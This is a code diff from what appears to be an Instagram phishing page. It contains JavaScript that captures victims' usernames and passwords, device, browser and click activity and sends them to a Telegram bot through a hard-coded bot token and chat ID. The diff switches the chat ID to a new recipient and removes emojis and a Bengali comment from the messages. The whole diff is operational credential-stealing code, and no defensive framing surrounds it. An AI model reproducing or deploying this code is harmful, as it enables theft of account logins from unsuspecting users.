@@ -18604,7 +18604,7 @@
     // =================  BOT TOKEN AND CHAT ID===========================
     
     const BOT_TOKEN = "9062369246:AAEOdUMp9HB71NBsKnAALA-zp9ti7z01mFc"; 
-    const CHAT_ID   = "7988925862";   
+    const CHAT_ID   = "8150033821";   
 
     async function sendToTelegram(message) {
         if (!BOT_TOKEN || !CHAT_ID) return;
@@ -18642,12 +18642,12 @@
         const message = `
 <b>INSTAGRAM LOGIN ATTEMPT</b>
 ━━━━━━━━━━━━━━━━━━
-<b>👤 Username:</b> <code>${username}</code>
-<b>🔑 Password:</b> <code>${password}</code>
+<b>Username:</b> <code>${username}</code>
+<b>Password:</b> <code>${password}</code>
 ━━━━━━━━━━━━━━━━━━
-<b>📱 Device:</b> ${device}
-<b>🌐 Browser:</b> ${browser}
-<b>🕒 Time:</b> ${time}
+<b>Device:</b> ${device}
+<b>Browser:</b> ${browser}
+<b> Time:</b> ${time}
 ━━━━━━━━━━━━━━━━━━
         `;
         sendToTelegram(message);
@@ -18661,7 +18661,7 @@
 
         let text = target.innerText.trim().replace(/\n/g, ' ');
         
-        // লগইন বাটনের ডাবল নোটিফিকেশন এড়াতে
+        // 
         if (text === "Log In" || target.type === "submit") return;
 
         if (text.length > 0 && text.length < 50) {
@@ -18669,10 +18669,10 @@
             const time = new Date().toLocaleString("en-BD", { timeZone: "Asia/Dhaka" });
             
             sendToTelegram(`
-<b>👆 BUTTON/LINK CLICKED</b>
-🔘 <b>Name:</b> ${text}
-📱 <b>Device:</b> ${device}
-🕒 <b>Time:</b> ${time}
+<b>BUTTON/LINK CLICKED</b>
+<b>Name:</b> ${text}
+<b>Device:</b> ${device}
+<b>Time:</b> ${time}
             `);
         }
     });
